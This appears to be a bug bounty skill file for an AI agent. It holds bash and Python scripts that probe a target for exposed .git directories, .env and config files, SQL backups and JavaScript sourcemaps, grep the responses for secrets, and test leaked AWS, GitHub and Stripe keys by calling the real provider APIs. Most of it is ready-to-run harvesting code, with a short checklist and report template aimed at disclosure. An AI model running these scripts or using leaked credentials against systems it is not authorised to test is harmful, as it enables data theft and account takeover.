---
name: k1nzr3c0n-hunt-source-leak
description: "Source code / secrets leak hunting skill built from 31 disclosed bug bounty reports. Covers source maps (.js.map), .git exposure, .env files, swagger/openapi, build artifacts, webpack chunks, backup files (.bak/.old), GitHub Actions secrets, robots.txt forbidden paths."
tags: [source-leak, secrets, hunt, web-security, bug-bounty]
report_count: 31
---

# K1NZR3C0N Hunt — Source Leak / Exposed Secrets

> **Verify secrets are real**: AWS key must be live (sts get-caller-identity), GitHub token must have actual scope.
> **Severity depends on secret value**: leaked .env with DB creds = Critical; leaked config with test creds = Low.

---

## Crown Jewels

```
Priority 1 — .env with DB credentials / API keys / JWT secrets
Priority 2 — .git/ exposure → full source code download
Priority 3 — JavaScript sourcemaps → unminified backend logic
Priority 4 — Swagger/OpenAPI with undocumented endpoints
Priority 5 — AWS/GitHub/Stripe keys in any leaked file
```

---

## Phase 0 — Automated Secret Discovery (from k1nzr3c0n)

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_leak_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

RUNS_BASE="/app/runs"
echo "=== Secrets from k1nzr3c0n tools ==="

# TruffleHog results
find "$RUNS_BASE" -name "trufflehog*" -o -name "*.jsonl" 2>/dev/null | \
  xargs jq -r 'select(.Verified==true) | "[VERIFIED] [\(.DetectorName)] \(.Raw[:60])"' 2>/dev/null

# Nuclei secret findings
find "$RUNS_BASE" -name "nuclei*" 2>/dev/null | \
  xargs grep -iE 'api.?key|secret|password|token|aws|firebase|stripe|private.?key' 2>/dev/null | \
  grep -ivE 'placeholder|example|test123|changeme|dummy' | sort -u | head -20
```

## Phase 1 — .git Exposure

```bash
echo "=== .git Directory Exposure ==="
BASE="https://${TARGET}"

# Quick check
RESP=$(curl -sk "${BASE}/.git/HEAD")
echo "$RESP" | grep -q 'ref:' && echo "  [EXPOSED] .git/HEAD: $RESP"

# If exposed, enumerate
if echo "$RESP" | grep -q 'ref:'; then
  echo "  [+] .git exposed — attempting source download"
  
  # Download key files
  for GITFILE in \
    "/.git/config" \
    "/.git/COMMIT_EDITMSG" \
    "/.git/logs/HEAD" \
    "/.git/packed-refs"; do
    CONTENT=$(curl -sk "${BASE}${GITFILE}")
    [ -n "$CONTENT" ] && echo "  ${GITFILE}: ${CONTENT:0:100}"
  done
  
  echo ""
  echo "Full git download tool: git-dumper"
  echo "  pip3 install git-dumper && git-dumper ${BASE}/.git/ $HUNT/git-dump/"
fi
```

## Phase 2 — Exposed Files

```bash
echo "=== Common Exposed Files ==="
BASE="https://${TARGET}"

EXPOSED_PATHS=(
  # Environment files
  "/.env"
  "/.env.production"
  "/.env.local"
  "/.env.backup"
  "/config/.env"
  "/app/.env"
  # Configuration
  "/config.php"
  "/config.yml"
  "/configuration.php"
  "/settings.py"
  "/application.properties"
  "/appsettings.json"
  # Database
  "/database.yml"
  "/db.php"
  "/wp-config.php"
  "/wp-config.php.bak"
  # Backup files
  "/backup.sql"
  "/dump.sql"
  "/database.sql"
  "/backup.zip"
  "/backup.tar.gz"
  # Source maps (critical)
  "/js/app.js.map"
  "/static/js/main.chunk.js.map"
  "/bundle.js.map"
  # API docs
  "/swagger.json"
  "/openapi.json"
  "/api-docs"
  "/v1/docs"
  "/.well-known/openid-configuration"
  # Debug/admin
  "/phpinfo.php"
  "/info.php"
  "/test.php"
  "/debug.php"
  "/server-status"
  "/server-info"
  # Package files
  "/package.json"
  "/composer.json"
  "/requirements.txt"
  "/Gemfile"
  "/Dockerfile"
  "/docker-compose.yml"
)

for PATH in "${EXPOSED_PATHS[@]}"; do
  STATUS=$(curl -sk -o "$HUNT/resp_$(basename $PATH)" -w '%{http_code}' "${BASE}${PATH}" 2>/dev/null)
  if [ "$STATUS" = "200" ]; then
    SIZE=$(wc -c < "$HUNT/resp_$(basename $PATH)")
    echo "  [$STATUS ${SIZE}B] $PATH"
    # Extract secrets from found files
    grep -ihoP '(?:password|secret|key|token|api_key|db_pass|aws)[=:][^\s"\x27\n]{8,}' \
      "$HUNT/resp_$(basename $PATH)" 2>/dev/null | \
      grep -ivE '(placeholder|example|test123|changeme|dummy|xxx)' | \
      sed 's/^/    SECRET: /'
  fi
done
```

## Phase 3 — JavaScript Sourcemaps

```bash
echo "=== JavaScript Sourcemap Analysis ==="
BASE="https://${TARGET}"

# Find .map files
curl -sk "${BASE}/" | grep -oP 'src=["\x27][^"\x27]+\.js["\x27]' | \
  grep -oP '[^"\x27]+\.js' | while read JSFILE; do
  MAP_URL="${BASE}${JSFILE}.map"
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "$MAP_URL")
  if [ "$STATUS" = "200" ]; then
    echo "  [MAP EXPOSED] $MAP_URL"
    # Download and extract source
    curl -sk "$MAP_URL" | python3 -c "
import json, sys
try:
    m = json.load(sys.stdin)
    sources = m.get('sources', [])
    print(f'  Sources ({len(sources)}):')
    for s in sources[:10]:
        print(f'    {s}')
    # Look for secrets in sourcesContent
    for content in (m.get('sourcesContent') or []):
        if content:
            import re
            secrets = re.findall(r'(?:api.?key|secret|password|token)[=:\"\x27][^\n\"\x27]{8,}', content, re.I)
            for s in secrets[:5]:
                print(f'  SECRET: {s}')
except Exception as e:
    print(f'  Parse error: {e}')
"
  fi
done
```

## Phase 4 — Verify Secret Liveness

```bash
echo "=== Secret Verification (Confirm Active) ==="

# AWS Key verification (read-only)
AWS_KEY="${LEAKED_AWS_KEY:-}"
AWS_SECRET="${LEAKED_AWS_SECRET:-}"
if [ -n "$AWS_KEY" ] && [ -n "$AWS_SECRET" ]; then
  echo "Verifying AWS key: $AWS_KEY"
  AWS_ACCESS_KEY_ID="$AWS_KEY" \
  AWS_SECRET_ACCESS_KEY="$AWS_SECRET" \
  aws sts get-caller-identity 2>&1 | head -5
fi

# GitHub token
GH_TOKEN="${LEAKED_GH_TOKEN:-}"
if [ -n "$GH_TOKEN" ]; then
  echo "Verifying GitHub token:"
  curl -sk -H "Authorization: token $GH_TOKEN" https://api.github.com/user | \
    python3 -m json.tool 2>/dev/null | grep -E '"login"|"email"|"name"'
  # Check scopes
  curl -skI -H "Authorization: token $GH_TOKEN" https://api.github.com/user | \
    grep -i 'x-oauth-scopes'
fi

# Stripe key
STRIPE_KEY="${LEAKED_STRIPE_KEY:-}"
if [ -n "$STRIPE_KEY" ]; then
  curl -sk "https://api.stripe.com/v1/balance" \
    -u "${STRIPE_KEY}:" | python3 -m json.tool 2>/dev/null | head -5
fi
```

## Gate 0

```bash
echo "=== Source Leak Gate 0 ==="
echo "  □ Secret is LIVE (verified with API call, not just leaked text)"
echo "  □ Secret has REAL permissions (not read-only test key)"
echo "  □ .env: contains actual credentials (DB_PASSWORD, SECRET_KEY)"
echo "  □ .git: actual source code downloaded with history"
echo "  □ Sourcemap: private business logic or credentials in source"
echo "  □ Severity based on secret value — empty config = Info, live DB creds = Critical"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Exposed .env file at [/.env] contains live AWS access keys (verified: sts get-caller-identity returns account ID)
.git directory exposed at [/.git/] allows complete source code download including private API keys and database credentials
JavaScript sourcemap at [/js/app.js.map] reveals unminified source code including hardcoded JWT secret
```
